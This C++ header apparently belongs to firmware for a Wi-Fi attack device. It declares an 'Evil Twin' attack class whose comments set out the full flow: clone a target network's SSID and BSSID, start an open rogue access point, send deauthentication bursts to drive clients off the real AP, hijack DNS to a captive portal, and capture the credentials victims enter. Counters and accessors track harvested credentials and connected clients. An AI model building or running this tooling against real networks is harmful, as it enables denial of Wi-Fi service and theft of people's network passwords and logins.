#pragma once

#include "../ap/ap_types.h"
#include "../ap/arduino_captive.h"
#include "deauth.h"
#include <cstdint>

namespace attack {

/**
 * @brief Evil Twin attack state
 */
enum class EvilTwinState {
    IDLE,
    STARTING,
    RUNNING,
    STOPPING,
    ERROR
};

/**
 * @brief Evil Twin attack statistics
 */
struct EvilTwinStats {
    uint32_t clientsConnected = 0;      // Current connected clients
    uint32_t totalConnections = 0;      // Total connections since start
    uint32_t credentialsCaptured = 0;   // Credentials harvested
    uint32_t dnsQueries = 0;            // DNS queries answered
    uint32_t httpRequests = 0;          // HTTP requests served
    uint32_t deauthsSent = 0;           // Deauth frames sent to real AP
    uint32_t startTime = 0;             // Attack start timestamp
    
    uint32_t getDuration() const;
};

/**
 * @brief Evil Twin AP Attack
 * 
 * Creates a rogue access point that mimics a target network.
 * Combines SoftAP, DNS hijacking, and captive portal to
 * intercept credentials from unsuspecting clients.
 * 
 * Attack flow:
 * 1. Clone target network's SSID (optionally BSSID)
 * 2. Start soft AP with same name but no encryption
 * 3. Deauth clients from real AP to force reconnection
 * 4. Clients connect to our rogue AP (stronger signal / open)
 * 5. DNS hijacks all requests to our captive portal
 * 6. Portal captures credentials
 */
class EvilTwin {
public:
    EvilTwin();
    ~EvilTwin();
    
    // Prevent copying
    EvilTwin(const EvilTwin&) = delete;
    EvilTwin& operator=(const EvilTwin&) = delete;
    
    /**
     * @brief Configure Evil Twin for target network
     * @param ssid Target network SSID to clone
     * @param bssid Target BSSID (optional, for MAC cloning)
     * @param channel Target channel
     */
    void setTarget(const char* ssid, const uint8_t* bssid = nullptr, uint8_t channel = 1);
    
    /**
     * @brief Enable/disable deauth of real AP clients
     * @param enable If true, periodically deauth clients from real AP
     * @param intervalMs Interval between deauth bursts
     */
    void setDeauthEnabled(bool enable, uint32_t intervalMs = 5000);
    
    /**
     * @brief Configure captive portal
     * @param config Portal configuration
     */
    void setPortalConfig(const ap::CaptivePortalConfig& config);
    
    /**
     * @brief Force stop the captive portal (DNS + HTTP) regardless of state
     * Used to ensure DNS port 53 is released before other attacks start
     */
    void forceStopPortal() { arduinoPortal_.stop(); }
    
    /**
     * @brief Start Evil Twin attack
     * @return true if started successfully
     */
    bool start();
    
    /**
     * @brief Stop Evil Twin attack
     */
    void stop();
    
    /**
     * @brief Update attack (call in main loop)
     * Processes DNS, HTTP, deauth timing
     */
    void update();
    
    /**
     * @brief Get current attack state
     */
    EvilTwinState getState() const { return state_; }
    
    /**
     * @brief Check if attack is active
     */
    bool isRunning() const { return state_ == EvilTwinState::RUNNING; }
    
    /**
     * @brief Get attack statistics
     */
    const EvilTwinStats& getStats() const { return stats_; }
    
    /**
     * @brief Get captured credentials
     */
    const std::vector<ap::CapturedCredential>& getCredentials() const;
    
    /**
     * @brief Get connected clients
     * @param clients Output array
     * @param maxClients Size of output array
     * @return Number of clients
     */
    uint8_t getClients(ap::APClient* clients, uint8_t maxClients) const;
    
    /**
     * @brief Get target SSID
     */
    const char* getTargetSSID() const { return targetSSID_; }
    
    /**
     * @brief Get target channel
     */
    uint8_t getTargetChannel() const { return targetChannel_; }

private:
    EvilTwinState state_ = EvilTwinState::IDLE;
    EvilTwinStats stats_;
    
    // Target network info
    char targetSSID_[33] = {0};
    uint8_t targetBSSID_[6] = {0};
    uint8_t targetChannel_ = 1;
    bool hasTargetBSSID_ = false;
    
    // Deauth settings
    bool deauthEnabled_ = false;  // Default OFF - user must enable explicitly
    uint32_t deauthIntervalMs_ = 5000;
    uint32_t lastDeauthTime_ = 0;
    
    // Components - use Arduino-based captive portal for reliability
    ap::ArduinoCaptivePortal arduinoPortal_;  // Combined DNS + HTTP using Arduino libs
    // Note: Uses DeauthAttack::getInstance() singleton
    
    // Portal config (still used for some settings)
    ap::CaptivePortalConfig portalConfig_;
    void sendDeauthBurst();
    void updateStats();
};

} // namespace attack
